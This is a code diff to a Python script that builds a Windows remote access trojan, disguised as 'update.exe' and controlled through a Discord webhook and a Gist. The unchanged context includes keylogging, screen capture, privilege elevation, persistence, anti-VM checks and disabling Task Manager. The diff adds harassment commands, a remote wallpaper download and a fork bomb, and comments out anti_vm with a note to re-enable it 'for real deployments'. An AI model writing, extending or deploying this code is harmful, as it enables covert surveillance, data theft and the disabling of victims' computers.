@@ -28,7 +28,7 @@ webhook_url = input("Discord webhook URL (main one for initial bite): ").strip()
 command_url = input("Gist raw URL (FIXED_RAW_URL): ").strip()
 output_name = "update.exe"
 
-rat_code = r'''import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
+rat_code = r'''import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip, urllib.request
 from PIL import ImageGrab
 from pynput.keyboard import Listener, Key
 from cryptography.fernet import Fernet
@@ -107,7 +107,7 @@ def lock_pc():
 
 def toggle_tm(enable=True):
     try:
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
         winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
         winreg.CloseKey(key)
         send(f"Task Manager {'enabled' if enable else 'disabled'}")
@@ -170,6 +170,28 @@ def setwebhook(url):
     WEBHOOK_URL = url
     send("Webhook switched to new URL")
 
+def msgbox(text):
+    ctypes.windll.user32.MessageBoxW(0, text, "Important Message", 1)
+    send(f"Message box shown: {text}")
+
+def volume_max():
+    subprocess.call("nircmd.exe setsysvolume 65535", shell=True)  # Needs nircmd bundled or use win API
+    send("Volume cranked to max")
+
+def openurl(url):
+    os.startfile(url)
+    send(f"Opened URL: {url}")
+
+def set_wallpaper(url):
+    path = os.path.join(os.getenv("TEMP"), "wallpaper.jpg")
+    urllib.request.urlretrieve(url, path)
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
+    send(f"Wallpaper set to {url}")
+
+def forkbomb():
+    while True:
+        subprocess.Popen(sys.argv[0])
+
 def poll():
     while True:
         try:
@@ -204,12 +226,22 @@ def poll():
                     runscript(arg)
                 elif cmd == "setwebhook":
                     setwebhook(arg)
+                elif cmd == "msgbox":
+                    msgbox(arg or "You have been owned")
+                elif cmd == "volume":
+                    volume_max()
+                elif cmd == "openurl":
+                    openurl(arg or "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+                elif cmd == "wallpaper":
+                    set_wallpaper(arg or "https://i.imgur.com/removed.png")
+                elif cmd == "forkbomb":
+                    forkbomb()
         except:
             pass
         time.sleep(POLL_INTERVAL)
 
 if __name__ == "__main__":
-    anti_vm()
+    # anti_vm()  # Commented for VM testing — uncomment for real deployments
     elevate()
     persist()
     info()
@@ -224,7 +256,7 @@ rat_code = rat_code.replace("PLACEHOLDER_COMMAND", command_url)
 with open("rat.py", "w") as f:
     f.write(rat_code)
 
-print("Building full RAT - all functions included...")
+print("Building non-instant-BSOD RAT with new commands...")
 subprocess.run([
     "pyinstaller","--onefile","--noconsole",
     "--collect-all","pynput",
@@ -238,7 +270,7 @@ shutil.rmtree("__pycache__", ignore_errors=True)
 os.remove("rat.py") if os.path.exists("rat.py") else None
 os.remove("rat.spec") if os.path.exists("rat.spec") else None
 
-print(f"Done - no more NameError. EXE at dist\\{output_name}")
+print(f"EXE ready: dist\\{output_name} — no instant BSOD, anti_vm commented for testing")
 
 
 
